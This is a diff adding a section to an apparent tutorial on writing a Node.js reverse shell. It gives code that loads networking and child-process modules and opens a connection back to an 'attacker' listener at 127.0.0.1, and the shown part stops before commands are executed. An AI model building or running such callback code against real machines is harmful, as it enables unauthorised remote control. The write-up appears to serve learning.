@@ -52,4 +52,49 @@ Let's go through each flag
 `-p` let us specify the port to start listening on
 
 
+# Now we play
+
+The part regarding the ATTACKER is pretty much done. Now I started playing with Javascript to implement the code to open the reverse shell.
+
+Javascript + Node.js to be exact.
+
+This is the list of node_modules that I needed: 
+`npm list >>
+ child_process@1.0.2
+ net@1.0.2`
+ 
+ 
+ First I included the required modules and the use of ENV variables
+ 
+```
+const net = require("node:net");
+const child_process=require("node:child_process");
+
+const{env} = require("node:process");
+```
+ 
+ 
+After that I defined PORT as an environment variables (NODE_PORT) if set, or as the 8000 port
+
+`const PORT = env["NODE_PORT"] || 8000;`
+
+
+Now comes the best part: **Establishing a network connection**
+
+
+This bit will make the PC establish a connection to the ATTACKER IP(127.0.0.1) on port 8000
+
+```
+const client= net.createConnection({host: "127.0.0.1", port: PORT}, () =>{ 
+                                                 
+    client.write("Connected\r\n $> ");
+
+});
+```
+
+And once the connection as been established, I will see "Connected" \n "$>" on my terminal, the ATTACKER terminal
+
+
+
+
 
